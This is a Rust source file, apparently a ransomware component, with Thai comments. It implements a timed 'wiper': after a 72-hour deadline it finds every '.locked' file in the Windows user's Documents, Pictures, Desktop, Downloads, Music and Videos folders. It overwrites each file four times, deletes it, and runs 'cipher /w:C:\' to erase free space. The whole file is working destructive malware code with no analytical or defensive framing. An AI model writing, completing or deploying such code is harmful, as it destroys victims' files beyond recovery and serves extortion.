use std::fs::{self, OpenOptions};
use std::io::{Write, Seek, SeekFrom};
use std::path::Path;
use std::process::Command;
use std::thread;
use std::time::Duration;
use chrono::{Duration as ChronoDuration, Utc};
use rand::{RngCore, rngs::OsRng};
use walkdir::WalkDir;

pub fn start_wiper() {
    thread::spawn(|| {
        // Deadline 72 ชั่วโมง
        let deadline = Utc::now() + ChronoDuration::hours(72);

        loop {
            let now = Utc::now();
            if now >= deadline {
                // ถึง deadline แล้ว - เริ่ม wiper mode
                wipe_files();
                break;
            }
            // เช็คทุก 1 ชั่วโมง
            thread::sleep(Duration::from_secs(3600));
        }
    });
}

fn secure_wipe_file(path: &Path) -> std::io::Result<()> {
    // เปิดไฟล์สำหรับเขียน
    let mut file = OpenOptions::new()
        .write(true)
        .open(path)?;

    // ได้ขนาดไฟล์
    let file_size = file.metadata()?.len() as usize;

    // Pass 1: Overwrite with zeros
    file.seek(SeekFrom::Start(0))?;
    let zeros = vec![0u8; file_size];
    file.write_all(&zeros)?;

    // Pass 2: Overwrite with random data
    file.seek(SeekFrom::Start(0))?;
    let mut random_data = vec![0u8; file_size];
    OsRng.fill_bytes(&mut random_data);
    file.write_all(&random_data)?;

    // Pass 3: Overwrite with zeros again
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&zeros)?;

    // Pass 4: Overwrite with ones
    let ones = vec![0xFFu8; file_size];
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&ones)?;

    // Flush และปิดไฟล์
    file.flush()?;
    drop(file);

    // ลบไฟล์
    fs::remove_file(path)?;

    Ok(())
}

fn wipe_files() {
    let user_profile = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let dirs = ["Documents", "Pictures", "Desktop", "Downloads", "Music", "Videos"];

    // ค้นหาไฟล์ .locked และทำ secure wipe
    for dir in dirs.iter() {
        let base_path = Path::new(&user_profile).join(dir);
        if base_path.exists() {
            for entry in WalkDir::new(&base_path).into_iter().filter_map(|e| e.ok()) {
                let path = entry.path();
                if path.is_file() {
                    if let Some(ext) = path.extension() {
                        if ext == "locked" {
                            let _ = secure_wipe_file(path);
                        }
                    }
                }
            }
        }
    }

    // Wipe free space
    if cfg!(windows) {
        let _ = Command::new("cipher")
            .args(&["/w:C:\\"])
            .output();
    }
}